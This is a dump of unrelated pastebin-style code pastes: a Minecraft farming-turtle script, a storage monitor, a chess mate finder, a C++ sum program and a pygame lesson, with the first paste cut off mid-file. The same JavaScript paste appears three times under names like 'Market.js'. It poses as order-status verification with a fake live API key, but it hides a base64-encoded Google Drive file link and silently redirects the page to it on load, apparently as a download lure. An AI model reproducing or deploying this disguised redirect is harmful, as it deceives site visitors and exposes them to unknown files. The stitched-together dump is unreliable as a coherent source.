            if not seed and seedItems[item.name] then
                seed = {slot = i, name = item.name, count = item.count, limit = turtle.getItemSpace(i)}
            elseif not turtle.refuel(0) then
                inventory[item.name] = inventory[item.name] or {}
                inventory[item.name][i] = item.count
            elseif not fuel then
                fuel = {slot = i, name = item.name, count = item.count, limit = turtle.getItemSpace(i)}
            end
        end
    end
    local name = peripheral.find(""modem"", function(_, v) return not v.isWireless() end).getNameLocal()
    for _, chest in ipairs{peripheral.find(""minecraft:chest"")} do
        local items = chest.list()
        for i = 1, chest.size() do
            if items[i] then
                local item = items[i].name
                if inventory[item] then
                    for slot, count in pairs(inventory[item]) do
                        local d = chest.pullItems(name, slot, count, i)
                        if d == 0 then break end
                        if count - d <= 0 then inventory[item][slot] = nil
                        else inventory[item][slot] = count - d end
                    end
                    if not next(inventory[item]) then inventory[item] = nil end
                elseif fuel and fuel.count < fuel.limit and item == fuel.name then
                    local d = chest.pushItems(name, i, fuel.limit - fuel.count, fuel.slot)
                    fuel.count = fuel.count + d
                elseif seed and seed.count < seed.limit and item == seed.name then
                    local d = chest.pushItems(name, i, seed.limit - seed.count, seed.slot)
                    seed.count = seed.count + d
                end
            end
            if not next(inventory) then break end
        end
        if not next(inventory) then break end
    end
    if next(inventory) then
        for _, chest in ipairs{peripheral.find(""minecraft:chest"")} do
            local items = chest.list()
            for i = 1, chest.size() do
                if not items[i] then
                    local item, list = next(inventory)
                    for slot, count in pairs(list) do
                        local d = chest.pullItems(name, slot, count, i)
                        if d == 0 then break end
                        if count - d <= 0 then list[slot] = nil
                        else list[slot] = count - d end
                    end
                    if not next(list) then inventory[item] = nil end
                end
                if not next(inventory) then break end
            end
            if not next(inventory) then break end
        end
    end
    if not fuel or not seed then
        for _, chest in ipairs{peripheral.find(""minecraft:chest"")} do
            local items = chest.list()
            for i = 1, chest.size() do
                if items[i] and ((fuel and items[i].name == fuel.name and fuel.count < fuel.limit) or (not fuel and fuels[items[i].name])) then
                    local d = chest.pushItems(name, i, fuel and fuel.count - fuel.limit, 16)
                    if fuel then fuel.count = fuel.count + d
                    else fuel = {name = items[i].name, count = d, limit = turtle.getItemSpace(16)} end
                end
                if items[i] and ((seed and items[i].name == seed.name and seed.count < seed.limit) or (not seed and seedItems[items[i].name])) then
                    local d = chest.pushItems(name, i, seed and seed.count - seed.limit, 1)
                    if seed then seed.count = seed.count + d
                    else seed = {name = items[i].name, count = d, limit = turtle.getItemSpace(1)} end
                end
                if (fuel and fuel.count >= fuel.limit) and (seed and seed.count >= seed.limit) then break end
            end
            if (fuel and fuel.count >= fuel.limit) and (seed and seed.count >= seed.limit) then break end
        end
    end
end

if fs.exists(""jackmacwindows.farm-state.txt"") then
    local file = fs.open(""jackmacwindows.farm-state.txt"", ""r"")
    x, y, z, direction = tonumber(file.readLine()), tonumber(file.readLine()), tonumber(file.readLine()), tonumber(file.readLine())
    invertDirection = file.readLine() == ""true""
    file.close()
    -- check if we were on a boundary block first
    local found, block, ok, err, boundary
    local lastY = y
    repeat
        found, block = turtle.inspectDown()
        if not found then check(down()) end
    until found
    if groundBlocks[block.name] then
        check(up())
        turtle.digDown()
    elseif not cropBlocks[block.name] then
        if y == lastY then lastY = lastY + 1 end
        while y < lastY do check(up()) end
        while not back() do check(up()) end
        boundary = true
    end
    if direction == 1 or direction == 3 then
        -- we were in the middle of a rotation, finish that before continuing
        local mv = (direction == 0) == invertDirection and left or right
        if boundary then
            check(mv())
            check(mv())
            check(tryForward())
            invertDirection = not invertDirection
            mv = mv == left and right or left
            writePos()
        end
        check(mv())
        handleCrop()
        if x == 0 and z == 0 then
            while y > 0 do check(down()) end
            while y < 0 do check(up()) end
            exchangeItems()
        end
    end
elseif not peripheral.find(""minecraft:chest"") or not peripheral.find(""modem"", function(_, m) return not m.isWireless() end) then
    print[[
Please move the turtle to the starting position next to a modem with a chest.
The expected setup is the turtle next to a wired modem block, with a chest next to that modem block.
This program cannot run until placed correctly.
]]
    return
else exchangeItems() end

local ok, err
while true do
    ok, err = tryForward()
    if not ok then
        if err == ""Out of bounds"" then
            local mv = (direction == 0) == invertDirection and left or right
            check(mv())
            ok, err = tryForward()
            if not ok then
                if err == ""Out of bounds"" then
                    check(mv())
                    check(mv())
                    check(tryForward())
                    invertDirection = not invertDirection
                    mv = mv == left and right or left
                    writePos()
                else panic(err) end
            end
            check(mv())
        else panic(err) end
    end
    handleCrop()
    if x == 0 and z == 0 then
        while y > 0 do check(down()) end
        while y < 0 do check(up()) end
        exchangeItems()
        os.sleep(300)
    elseif peripheral.find(""modem"") then
        x, y, z = 0, 0, 0
        exchangeItems()
    end
    if turtle.getFuelLevel() < 100 then refuel() end
end"
vPkrnXsC,Market.js,luqlegal,JavaScript,Thursday 10th of April 2025 12:40:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76274/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
uer8ZV1p,Untitled,vitormartinotti,C++,Thursday 10th of April 2025 12:29:58 PM CDT,"#include <bits/stdc++.h>

int main(){
    int n, soma=0;
    scanf(""%d"", &n);
    while(n--){
        int num;
        scanf(""%d"", &num);
        soma += num;
    }
    printf(""%d"", soma);
}"
phX4Uc0Q,Untitled,luqlegal,JavaScript,Thursday 10th of April 2025 12:24:45 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/36701/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9gfMZ3yL,excellent 2,max2201111,Python,Thursday 10th of April 2025 12:22:46 PM CDT,"import time
import math

MATE_SCORE = 10000
INF = 10000000

# Parse FEN string into board matrix and side to move
def parse_fen(fen_str):
    parts = fen_str.split()
    rows = parts[0].split('/')
    side_to_move = parts[1]
    board = []
    for rank in rows:
        row = []
        for ch in rank:
            if ch.isdigit():
                row.extend(['.'] * int(ch))
            else:
                row.append(ch)
        board.append(row)
    # Ensure 8 columns per rank
    for i in range(len(board)):
        if len(board[i]) < 8:
            board[i].extend(['.'] * (8 - len(board[i])))
    # Ensure 8 ranks
    while len(board) < 8:
        board.append(['.'] * 8)
    return board, side_to_move

# Directions for moves of each piece type
king_dirs   = [(-1,-1), (-1,0), (-1,1), (0,-1), (0,1), (1,-1), (1,0), (1,1)]
rook_dirs   = [(-1,0), (1,0), (0,-1), (0,1)]
bishop_dirs = [(-1,-1), (-1,1), (1,-1), (1,1)]
knight_moves = [(-2,-1), (-2,1), (-1,-2), (-1,2), (1,-2), (1,2), (2,-1), (2,1)]

# Czech piece names
piece_names = {
    'p': ""pěšec"",
    'r': ""věž"",
    'n': ""jezdec"",
    'b': ""střelec"",
    'q': ""dáma"",
    'k': ""král"",
    'a': ""amazonka"",
    'c': ""kardinál"",
    'e': ""eve""
}

# Dictionary defining how each piece moves
piece_moves = {
    'p': {'dirs': [], 'sliding': False},                           # Pawn (special handling)
    'r': {'dirs': rook_dirs, 'sliding': True},                     # Rook
    'n': {'dirs': knight_moves, 'sliding': False},                 # Knight
    'b': {'dirs': bishop_dirs, 'sliding': True},                   # Bishop
    'q': {'dirs': rook_dirs + bishop_dirs, 'sliding': True},       # Queen
    'k': {'dirs': king_dirs, 'sliding': False},                    # King
    'a': {'dirs': rook_dirs + bishop_dirs + knight_moves,          # Amazonka (queen + knight)
          'sliding': True, 'knight_like': True},
    'c': {'dirs': rook_dirs + knight_moves,                        # Cardinal (rook + knight)
          'sliding': True, 'knight_like': True},
    'e': {'dirs': bishop_dirs + knight_moves,                      # Eve (bishop + knight)
          'sliding': True, 'knight_like': True}
}

# Generate all moves for the given side
def generate_moves(board, side):
    moves = []
    
    for r in range(8):
        for c in range(8):
            piece = board[r][c]
            if piece == '.':
                continue
                
            # Skip pieces of the opposite side
            if side == 'w' and not piece.isupper():
                continue
            if side == 'b' and not piece.islower():
                continue
                
            piece_type = piece.lower()
            
            # Handle pawns specially
            if piece_type == 'p':
                if side == 'w':
                    # Move forward
                    if r > 0 and board[r-1][c] == '.':
                        moves.append((r, c, r-1, c))
                        # Double move from starting position
                        if r == 6 and board[r-2][c] == '.':
                            moves.append((r, c, r-2, c))
                    # Captures
                    for dc in [-1, 1]:
                        if 0 <= c+dc < 8 and r > 0:
                            target = board[r-1][c+dc]
                            if target != '.' and target.islower():
                                moves.append((r, c, r-1, c+dc))
                else:  # Black pawn
                    # Move forward
                    if r < 7 and board[r+1][c] == '.':
                        moves.append((r, c, r+1, c))
                        # Double move from starting position
                        if r == 1 and board[r+2][c] == '.':
                            moves.append((r, c, r+2, c))
                    # Captures
                    for dc in [-1, 1]:
                        if 0 <= c+dc < 8 and r < 7:
                            target = board[r+1][c+dc]
                            if target != '.' and target.isupper():
                                moves.append((r, c, r+1, c+dc))
            # Handle all other pieces
            elif piece_type in piece_moves:
                movement = piece_moves[piece_type]
                
                # Handle knight-like moves separately for special pieces
                if movement.get('knight_like', False):
                    for dr, dc in knight_moves:
                        nr, nc = r + dr, c + dc
                        if 0 <= nr < 8 and 0 <= nc < 8:
                            target = board[nr][nc]
                            if target == '.' or (side == 'w' and target.islower()) or (side == 'b' and target.isupper()):
                                moves.append((r, c, nr, nc))
                
                # Handle sliding or non-sliding moves
                dirs = movement['dirs']
                for dr, dc in dirs:
                    # Skip knight moves which are handled separately above
                    if movement.get('knight_like', False) and (abs(dr) == 2 or abs(dc) == 2):
                        continue
                        
                    nr, nc = r + dr, c + dc
                    # For non-sliding pieces, just check one step
                    if not movement['sliding']:
                        if 0 <= nr < 8 and 0 <= nc < 8:
                            target = board[nr][nc]
                            if target == '.' or (side == 'w' and target.islower()) or (side == 'b' and target.isupper()):
                                moves.append((r, c, nr, nc))
                    # For sliding pieces, check the entire ray
                    else:
                        while 0 <= nr < 8 and 0 <= nc < 8:
                            target = board[nr][nc]
                            if target == '.':
                                moves.append((r, c, nr, nc))
                            elif (side == 'w' and target.islower()) or (side == 'b' and target.isupper()):
                                moves.append((r, c, nr, nc))
                                break
                            else:
                                break
                            nr += dr
                            nc += dc
    
    return moves

# Check if king is in check
def is_in_check(board, side):
    # Find the king
    king_char = 'K' if side == 'w' else 'k'
    king_pos = None
    
    for r in range(8):
        for c in range(8):
            if board[r][c] == king_char:
                king_pos = (r, c)
                break
        if king_pos:
            break
            
    if not king_pos:
        return False  # No king found (shouldn't happen in normal chess)
        
    # Check if the king is attacked by any opponent piece
    attacking_side = 'b' if side == 'w' else 'w'
    opponent_moves = generate_moves(board, attacking_side)
    
    for move in opponent_moves:
        _, _, tr, tc = move
        if (tr, tc) == king_pos:
            return True
    
    return False

# Get legal moves (not leaving king in check)
def get_legal_moves(board, side):
    moves = generate_moves(board, side)
    legal_moves = []
    
    for move in moves:
        fr, fc, tr, tc = move
        
        # Make the move on a copy of the board
        board_copy = [row[:] for row in board]
        board_copy[tr][tc] = board_copy[fr][fc]
        board_copy[fr][fc] = '.'
        
        # Check if the move leaves the king in check
        if not is_in_check(board_copy, side):
            legal_moves.append(move)
    
    return legal_moves

# Apply a move to a board
def make_move(board, move):
    fr, fc, tr, tc = move
    new_board = [row[:] for row in board]
    new_board[tr][tc] = new_board[fr][fc]
    new_board[fr][fc] = '.'
    return new_board

# Print board in ASCII format
def print_board(board):
    print(""  a b c d e f g h"")
    for r in range(8):
        print(f""{8-r} {' '.join(board[r])} {8-r}"")
    print(""  a b c d e f g h"")

# Get move notation
def get_move_notation(board, move):
    fr, fc, tr, tc = move
    piece = board[fr][fc]
    piece_type = piece.lower()
    
    from_square = chr(ord('a') + fc) + str(8 - fr)
    to_square = chr(ord('a') + tc) + str(8 - tr)
    
    if piece_type == 'p':
        return from_square + '-' + to_square
    else:
        piece_symbol = piece_type.upper()
        if piece.islower():
            piece_symbol = piece_symbol.lower()
        return piece_symbol + from_square + '-' + to_square

# Pure minimax without alpha-beta pruning, focused on finding mate
def minimax(board, depth, maximizing_player, side):
    # Terminal state check
    legal_moves = get_legal_moves(board, side)
    
    if not legal_moves:
        if is_in_check(board, side):
            return -MATE_SCORE if maximizing_player else MATE_SCORE, None
        else:
            return 0, None  # Stalemate
    
    if depth == 0:
        # At max depth, if no terminal state is found, return a neutral score
        return 0, None
    
    if maximizing_player:
        max_eval = -INF
        best_move = None
        
        for move in legal_moves:
            new_board = make_move(board, move)
            next_side = 'b' if side == 'w' else 'w'
            
            eval_score, _ = minimax(new_board, depth - 1, False, next_side)
            
            if eval_score > max_eval:
                max_eval = eval_score
                best_move = move
        
        return max_eval, best_move
    else:
        min_eval = INF
        best_move = None
        
        for move in legal_moves:
            new_board = make_move(board, move)
            next_side = 'b' if side == 'w' else 'w'
            
            eval_score, _ = minimax(new_board, depth - 1, True, next_side)
            
            if eval_score < min_eval:
                min_eval = eval_score
                best_move = move
        
        return min_eval, best_move

# Find complete mate sequence
def find_mate_sequence(board, side, max_depth=100):
    # Matovou posloupnost hledáme iterativním prohlubováním
    for depth in range(1, max_depth + 1):
        start_time = time.time()
        
        # Spustíme minimax s aktuální hloubkou
        maximizing = (side == 'w')
        score, best_move = minimax(board, depth, maximizing, side)
        
        end_time = time.time()
        search_time = end_time - start_time
        
        # Vypíšeme informace o aktuální hloubce na jednom řádku
        print(f""Hloubka {depth}: Čas = {search_time:.3f}s"", end="""")
        
        # Pokud byl nalezen mat
        if abs(score) >= MATE_SCORE - 100:
            print(f"", Nalezen mat v hloubce {depth}!"")
            
            # Generujeme posloupnost tahů až do matu
            move_sequence = []
            current_board = [row[:] for row in board]
            current_side = side
            current_depth = depth
            
            # Budeme postupně generovat nejlepší tahy až do matu
            while current_depth > 0:
                # Najdeme nejlepší tah pro současnou stranu
                maximizing = (current_side == 'w')
                _, best_move = minimax(current_board, current_depth, maximizing, current_side)
                
                if not best_move:
                    break
                
                # Přidáme tah do sekvence
                move_sequence.append((current_side, best_move))
                
                # Vytiskneme stav po každém tahu
                fr, fc, tr, tc = best_move
                piece = current_board[fr][fc]
                piece_type = piece.lower()
                piece_name = piece_names.get(piece_type, f""figura {piece_type}"")
                
                move_from = chr(ord('a') + fc) + str(8 - fr)
                move_to = chr(ord('a') + tc) + str(8 - tr)
                
                print(f""\nTah {len(move_sequence)}: {'Bílý' if current_side == 'w' else 'Černý'} - {piece_name.capitalize()} {move_from}-{move_to}"")
                
                # Aplikujeme tah
                current_board = make_move(current_board, best_move)
                print_board(current_board)
                
                # Přepneme stranu
                current_side = 'b' if current_side == 'w' else 'w'
                
                # Když byl tento tah mat, skončíme
                if not get_legal_moves(current_board, current_side) and is_in_check(current_board, current_side):
                    print(""\nŠach mat!"")
                    break
                
                # Zmenšíme hloubku o 1 pro další tah
                current_depth -= 1
            
            return move_sequence
        else:
            print("""")  # Nový řádek po výpisu informací o hloubce
    
    print(""Žádný mat nebyl nalezen do zadané hloubky."")
    return []

# Hlavní funkce pro analýzu pozice z FEN řetězce
def analyze_position(fen, max_depth=100):
    print(""Šachový engine s čistým minimaxem"")
    print(""================================="")
    print(f""Analyzuji pozici: {fen}"")
    
    board, side = parse_fen(fen)
    
    print(""\nPočáteční pozice:"")
    print_board(board)
    print(f""Na tahu je: {'Bílý' if side == 'w' else 'Černý'}"")
    
    # Najdeme matovou posloupnost
    mate_sequence = find_mate_sequence(board, side, max_depth)
    
    if mate_sequence:
        print(""\nKompletní matová posloupnost:"")
        for i, (move_side, move) in enumerate(mate_sequence):
            fr, fc, tr, tc = move
            
            # Zjistit typ figury a její název
            piece = board[fr][fc]
            piece_type = piece.lower()
            piece_name = piece_names.get(piece_type, f""figura {piece_type}"")
            
            # Formát tahu v šachové notaci
            move_from = chr(ord('a') + fc) + str(8 - fr)
            move_to = chr(ord('a') + tc) + str(8 - tr)
            
            # Výpis tahu
            print(f""{i+1}. {'Bílý' if move_side == 'w' else 'Černý'}: {piece_name.capitalize()} {move_from}-{move_to}"")
            
            # Aplikovat tah na šachovnici pro další iteraci
            board = make_move(board, move)
    else:
        print(""Nebyla nalezena žádná matová posloupnost."")

# Hlavní spuštění
if __name__ == ""__main__"":
    # Pozice s věží
    fen = ""8/1K2k3/r7/8/8/8/8/8 b - - 0 1""

    fen = ""8/1K6/3k1r2/8/8/8/8/8 b - - 6 4""

    fen = ""8/AK6/3k1a2/8/8/8/8/8 b - - 0 1""
    
    # Spustíme analýzu s hledáním matové posloupnosti
    analyze_position(fen, max_depth=20)"
kQ1CvqP8,Minecraft CC:ME storage monitor,dengmahalYT,Lua,Thursday 10th of April 2025 12:11:22 PM CDT,"---@diagnostic disable: undefined-global, unused-local
local itemrows=33
local fluidrows=0
--local gasrows=0

local bridge = peripheral.find(""meBridge"")
if bridge == nil then error(""meBridge not found du idiot hastess vergessin"") end
local function wrapPs(peripheralName)
    local periTab={}
    local sideTab={}
    if peripheralName==nil then
        print(""Error"")
    end
    local peripherals = peripheral.getNames()
    local i2 = 1
    for i =1, #peripherals do
        if peripheral.getType(peripherals[i])==peripheralName then
            periTab[i2]=peripheral.wrap(peripherals[i])
            sideTab[i2]=peripherals[i]
            i2=i2+1
        end
    end
    if periTab~={} then
        return periTab,sideTab
    else
        return nil
    end
end
local me = wrapPs(""meBridge"")[1]
local mon = wrapPs(""monitor"")[1]
if mon==nil then
    error(""no monitor"")
end
local function CenterT(text, line, txtback , txtcolor, pos)
    if text==nil then
        text=""null""
    end
    local monX,monY = mon.getSize()
    mon.setBackgroundColor(txtback)
    mon.setTextColor(txtcolor)
    local length = string.len(text)
    local dif = math.floor(monX-length)
    local x = math.floor(dif/2)
    if pos == ""head"" then
        mon.setCursorPos(x+1, line)
        mon.write(text)
    elseif pos == ""left"" then
        mon.setCursorPos(2,line)
        mon.write(text)
    elseif pos == ""right"" then
        mon.setCursorPos(monX-length, line)
        mon.write(text)
    end
end
local function sort(a,b)
    return a.count>b.count
end
local function swap(tab, firstindex, secondindex)
    local temp = tab[firstindex]
    tab[firstindex] = tab[secondindex]
    tab[secondindex] = temp
end

local function partition(tab, left, right)
    local pivv = tab[right].count
    local partitionindex = left
    for i = left, right-1 do
        if tab[i].count < pivv then
            swap(tab, i, partitionindex)
            partitionindex = partitionindex + 1
        end
    end
    swap(tab, right, partitionindex)
    return partitionindex
end

local function quicksort(tab, left, right)
    left = left or 1
    right = right or #tab
    if left >= right then
        return tab
    end
    local pivi = partition(tab, left, right)
    quicksort(tab, left, pivi-1)
    quicksort(tab, pivi+1, right)
    return tab
end

local allitems=me.listItems()
local allfuilds=me.listFluid()
--local allgas=me.listGas()
while true do
    local itemcount=me.getUsedItemStorage()
    local fluidcount=me.getUsedFluidStorage()
    allitems=me.listItems()
    allfuilds=me.listFluid()
    local itypes=0
    local iutypes=#allitems
    local ftypes=0
    local futypes=#allfuilds
    --allgas=me.listGas()
    if itemrows>0 then
        allitems=quicksort(allitems)
    end
    if fluidrows>0 then
        allfuilds=quicksort(allfuilds)
    end
    --if gasrows>0 then
    --    quicksort(allgas)
    --end
    if #allitems==0 then
        for i=1,itemrows,1 do
            allitems[i]={count=0,name=""minecraft:air"",displayName=""air"",nbt={}}
        end
    end
    if #allfuilds==0 then
        for i=1,fluidrows,1 do
            allfuilds[i]={count=0,name=""minecraft:air"",displayName=""air""}
        end
    end
    --if #allgas==0 then
    --    for i=1,fluidrows,1 do
    --        allgas[i]={count=0,name=""minecraft:air"",displayName=""air""}
    --    end
    --end
    mon.clear()
    for i=1,itemrows,1 do
        local v=allitems[iutypes-i+1]
        CenterT(string.gsub(v.displayName,""   "","""") ,i+6, colors.black, colors.lightGray,""left"")
        CenterT(tostring(v.count) ,i+6, colors.black, colors.lightGray,""right"")
    end
    for i=1,fluidrows,1 do
        local v=allfuilds[futypes-i+1]
        if v==nil then
            v={}
            v.displayName=""air""
            v.count=0
        end
        CenterT(string.gsub(v.displayName,""   "","""") ,i+7+itemrows, colors.black, colors.lightGray,""left"")
        CenterT(tostring(v.count)..""mb"" ,i+7+itemrows, colors.black, colors.lightGray,""right"")
    end
    --for i=1,gasrows,1 do
    --    local v=allgas[i]
    --    CenterT(v.displayName ,i+8+itemrows, colors.black, colors.lightGray,""left"")
    --    CenterT(tostring(v.count)..""mb"" ,i+7+itemrows, colors.black, colors.lightGray,""right"")
    --end
    --local gtypes=0
    --local gutypes=#allgas
    local cells=me.listCells()
    for i=1,#cells do
        if cells[i].cellType==""item"" then
            itypes=itypes+63
        elseif cells[i].cellType==""fluid"" then
            ftypes=ftypes+18
        --elseif cells[i].celltype==""gas"" then
        --    ftypes=ftypes+63
        end
    end
    local maxeng=tonumber(me.getMaxEnergyStorage())*2
    local engstor=tonumber(me.getEnergyStorage())*2
    local enguse=tonumber(me.getEnergyUsage())*2
    local maxi=me.getTotalItemStorage()
    CenterT(""ME Storage Monitor v0.2 by dengmahal"" ,1, colors.black, colors.lightGray,""head"")
    CenterT(""Energy: ""..math.floor(engstor/10000+.5)/100 ..""MFE/""..math.floor(maxeng/10000)/100 ..""MFE"" ,2, colors.black, colors.lightBlue,""left"")
    CenterT(math.floor(enguse/10+.5)/100 ..""KFE/t"",2, colors.black, colors.lightBlue,""right"")
    CenterT(""Items: ""..itemcount..""/""..maxi.."" ""..tostring(math.floor((itemcount/maxi)*10+0.5)*10)..""%"",4,colors.black,colors.white,""left"")
    CenterT(""Fluids: ""..fluidcount..""mb/""..me.getTotalFluidStorage()..""mb"",5, colors.black, colors.blue,""left"")
    CenterT(""""..iutypes..""/""..itypes..""\t ""..tostring(math.floor((iutypes/itypes)*100+0.5))..""%"",4,colors.black,colors.white,""right"")
    CenterT(""""..futypes..""/""..ftypes..""\t ""..tostring(math.floor((futypes/ftypes)*100+0.5))..""%"",5,colors.black,colors.blue,""right"")
    sleep(5)
end"
t7gpJVqV,Products.js,luqlegal,JavaScript,Thursday 10th of April 2025 12:09:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24795/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
q2tR5cgR,Lesson 7 - Dynamic Camera,MCreeper12731,Python,Thursday 10th of April 2025 12:06:14 PM CDT,"import random
import pygame
pygame.init()
pygame.font.init()

font = pygame.font.SysFont(""Times New Roman"", 30)

WIDTH = 1200
HEIGHT = 600
window = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption(""Platformer Game"")

# Spremenljivke, ki jih bomo potrebovali za igralca
# ---

class Coin:
    def __init__(self, x, y):
        self.position = pygame.Rect(x, y, 50, 42)
        self.image = pygame.transform.scale(pygame.image.load(""images/cheeseburger.png""), (50, 42))

    def collect(self, player):
        player.score += 1

    def draw(self, player):
        x_relative = self.position.x - (player.position.x - player.x_relative)
        y_relative = self.position.y - (player.position.y - player.y_relative)

        window.blit(self.image, (x_relative, y_relative))

class Player:
    def __init__(self, x, y):
        self.size = 75
        self.position = pygame.Rect(x, y, self.size, self.size)
        self.image = pygame.image.load(""images/scratch-cat.png"")
        self.image = pygame.transform.scale(self.image, (self.size, self.size))
        self.speed_x = 0
        self.speed_y = 0
        self.jumps = 3
        self.score = 0
        self.direction = 0
        self.x_relative = (WIDTH - self.size) // 2
        self.y_relative = 3 * (HEIGHT - self.size) // 4
    
    def move(self):
        keys = pygame.key.get_pressed()
        if keys[pygame.K_d]:
            self.speed_x = 5
            self.direction = 1
        elif keys[pygame.K_a]:
            self.speed_x = -5
            self.direction = -1
        else:
            self.speed_x = 0

        if keys[pygame.K_SPACE] and self.jumps > 0 and self.speed_y > -5:
            self.jumps -= 1
            self.speed_y = -18

        if self.speed_y < 20:
            self.speed_y += 1

        self.position.x += self.speed_x
        self.position.y += self.speed_y

        # if self.position.x < 0:
        #     self.position.x = 0
        # if self.position.x > WIDTH - self.size:
        #     self.position.x = WIDTH - self.size
        # if self.position.y < 0:
        #     self.position.y = 0
        # if self.position.y > HEIGHT - self.size:
        #     self.position.y = HEIGHT - self.size
        
        for platform in platforms:
            if self.position.colliderect(platform.position):
                resolve_collision(self.position, platform.position)

    def draw(self):
        if (player.direction < 0):
            window.blit(pygame.transform.flip(player.image, True, False), (self.x_relative, self.y_relative))
        else:
            window.blit(self.image, (self.x_relative, self.y_relative))
        

class Platform:
    def __init__(self, x, y, width, height):
        self.position = pygame.Rect(x, y, width, height)

    def draw(self, player):
        x_relative = self.position.x - (player.position.x - player.x_relative)
        y_relative = self.position.y - (player.position.y - player.y_relative)
        
        pygame.draw.rect(window, (0, 127, 0), pygame.Rect(x_relative, y_relative, self.position.width, self.position.height))

        

player = Player(100, 100)

platforms = [Platform(0, HEIGHT - 50, WIDTH, 50), Platform(300, 500, 200, 20), Platform(600, 350, 200, 20), Platform(900, 400, 200, 20)]

coins = [Coin(400, 150), Coin(600, 200), Coin(900, 300)]
# ---

def resolve_collision(rect_a, rect_b):
    # Compute overlap distances in x and y
    dx1 = rect_b.right - rect_a.left
    dx2 = rect_a.right - rect_b.left
    dy1 = rect_b.bottom - rect_a.top
    dy2 = rect_a.bottom - rect_b.top

    # Find the smallest displacement to separate them
    min_dx = min(dx1, dx2)
    min_dy = min(dy1, dy2)

    if min_dx < min_dy:
        # Move rect_a left or right
        if dx1 < dx2:
            rect_a.x += dx1  # Move right
        else:
            rect_a.x -= dx2  # Move left
    else:
        # Move rect_a up or down
        if dy1 < dy2:
            pass
            # player.speed_y = 0
            # rect_a.y += dy1  # Move down
        else:
            player.jumps = 3
            player.speed_y = 0
            rect_a.y -= dy2  # Move up
    
    return True  # Collision was resolved

# Glavna zanka igre
clock = pygame.time.Clock()
running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

    window.fill((0, 255, 255))
    # background_image = pygame.image.load(""images/New Piskel.png"")
    # background_image = pygame.transform.scale(background_image, (width, height))
    # window.blit(background_image, (0, 0))
    # Premikanje igralčevega lika
    # ---

    # Vsako ponovitev zanke (vsak frame) dobimo pritisnjene tipke
    # in se glede na njih odločimo, kako bomo igralca premaknili

    player.move()

    for coin in coins:
        if player.position.colliderect(coin.position):
            coin.collect(player)
            coins.remove(coin)

    # ---
    # Izris likov
    # ---

    player.draw()

    font_render = font.render(f""Score: {player.score}"", False, (0, 0, 0))
    window.blit(font_render, (0, 0))
    
    for platform in platforms:
        platform.draw(player)

    for coin in coins:
        coin.draw(player)
        # window.blit(slika_ovire, platform)

    # ---

    pygame.display.update()
    clock.tick(60)

pygame.quit()"
